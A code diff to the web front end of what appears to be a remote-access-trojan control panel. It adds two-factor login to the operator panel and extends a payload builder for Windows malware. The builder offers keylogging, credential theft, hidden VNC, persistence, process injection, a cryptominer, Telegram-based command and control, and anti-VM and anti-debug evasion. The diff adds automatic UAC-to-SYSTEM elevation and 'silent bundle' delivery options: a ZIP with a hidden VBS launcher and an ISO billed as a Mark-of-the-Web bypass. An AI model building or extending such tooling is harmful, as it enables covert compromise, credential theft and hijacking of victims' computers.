@@ -122,24 +122,87 @@ function logout() {
   showLogin();
 }
 
+let loginTicket = null;
+
 $('#login-endpoint').textContent = location.host;
 $('#pw-toggle').addEventListener('click', () => {
   const inp = $('#login-pass');
   inp.type = inp.type === 'password' ? 'text' : 'password';
 });
-$('#login-form').addEventListener('submit', async (e) => {
-  e.preventDefault();
+
+function showTotpStep(setup, data) {
+  loginTicket = data.ticket;
+  $('#login-user').disabled = true;
+  $('#login-pass').disabled = true;
+  $('#login-error').classList.add('hidden');
+  if (setup) {
+    $('#totp-secret-value').textContent = data.secret;
+    $('#totp-secret-block').classList.remove('hidden');
+    const codeInput = $('#login-totp');
+    setTimeout(() => codeInput && codeInput.focus(), 50);
+  } else {
+    $('#totp-block').classList.remove('hidden');
+    const codeInput = $('#login-totp2');
+    setTimeout(() => codeInput && codeInput.focus(), 50);
+  }
+}
+
+$('#totp-copy').addEventListener('click', () => {
+  const v = $('#totp-secret-value').textContent;
+  navigator.clipboard.writeText(v).then(() => { $('#totp-copy').textContent = 'Copied'; });
+});
+
+async function finishTotpLogin(code) {
   const err = $('#login-error'); const btn = $('#login-submit');
   err.classList.add('hidden');
   btn.classList.add('loading'); btn.disabled = true;
   try {
-    const { token, user } = await api('/auth/login', {
+    const { token, user } = await api('/auth/totp', {
       method: 'POST',
-      body: JSON.stringify({ username: $('#login-user').value, password: $('#login-pass').value }),
+      body: JSON.stringify({ ticket: loginTicket, code }),
     });
     state.token = token; state.user = user;
     localStorage.setItem('pr_token', token);
     await boot();
+  } catch (ex) {
+    err.textContent = ex.message;
+    err.classList.remove('hidden');
+  } finally {
+    btn.classList.remove('loading'); btn.disabled = false;
+  }
+}
+
+$('#login-form').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const err = $('#login-error'); const btn = $('#login-submit');
+  err.classList.add('hidden');
+
+  // step 2: TOTP verification
+  if (loginTicket) {
+    const code = ($('#totp-secret-block').classList.contains('hidden')
+      ? $('#login-totp2') : $('#login-totp')).value.trim();
+    if (!/^\d{6}$/.test(code)) {
+      err.textContent = 'Enter the 6-digit code from your authenticator.';
+      err.classList.remove('hidden');
+      return;
+    }
+    await finishTotpLogin(code);
+    return;
+  }
+
+  // step 1: password
+  btn.classList.add('loading'); btn.disabled = true;
+  try {
+    const r = await fetch(API + '/auth/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: $('#login-user').value, password: $('#login-pass').value }),
+    });
+    const data = await r.json();
+    if (!r.ok) throw new Error(data.error || `HTTP ${r.status}`);
+    if (data.totp_setup) { showTotpStep(true, data); return; }
+    if (data.totp_required) { showTotpStep(false, data); return; }
+    throw new Error('unexpected login response');
   } catch (ex) {
     err.textContent = ex.message;
     err.classList.remove('hidden');
@@ -642,9 +705,12 @@ function renderBuilder() {
               <label class="switch"><input type="checkbox" id="b-hdr" /><span class="track"></span>Header-carry C2</label>
               <label class="switch"><input type="checkbox" id="b-antivm" checked /><span class="track"></span>Anti-VM</label>
               <label class="switch"><input type="checkbox" id="b-antidbg" checked /><span class="track"></span>Anti-debug</label>
+              <label class="switch"><input type="checkbox" id="b-autoesc" checked /><span class="track"></span>Auto UAC→SYSTEM</label>
             </div>
             <div class="form-grid">
-              <label class="field2 full"><span>Modules (csv or "all")</span><input id="b-modules" value="all" placeholder="esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,net,proc,anti,ws" /></label>
+              <label class="field2"><span>Silent bundle</span>
+                <select id="b-bundle"><option value="">none (raw .py)</option><option value="zip">ZIP (hidden VBS launcher)</option><option value="iso">ISO (MOTW-bypass container)</option></select></label>
+              <label class="field2"><span>Modules (csv or "all")</span><input id="b-modules" value="all" placeholder="esc,uac,runas,hvnc,keylog,creds,persist,exec,inject,net,proc,anti,ws" /></label>
               <label class="field2"><span>Decoy URLs (csv, optional)</span><input id="b-decoys" placeholder="https://www.bing.com,https://office.com" /></label>
               <label class="field2"><span>Kill date (YYYY-MM-DD, optional)</span><input id="b-killdate" placeholder="2027-01-01" /></label>
               <label class="field2"><span>Telegram bot token (transport=telegram)</span><input id="b-tgtoken" placeholder="123456:ABC-DEF…" /></label>
@@ -688,6 +754,8 @@ async function buildPayload() {
     keylog: $('#b-keylog').checked, miner: $('#b-miner').checked,
     miner_pool: $('#b-pool').value || undefined, miner_wallet: $('#b-wallet').value || undefined,
     header_carry: $('#b-hdr').checked, anti_vm: $('#b-antivm').checked, anti_debug: $('#b-antidbg').checked,
+    auto_elevate: $('#b-autoesc').checked,
+    bundle: $('#b-bundle').value || undefined,
     modules: $('#b-modules').value || 'all',
     decoys: $('#b-decoys').value || undefined,
     killdate: $('#b-killdate').value || undefined,
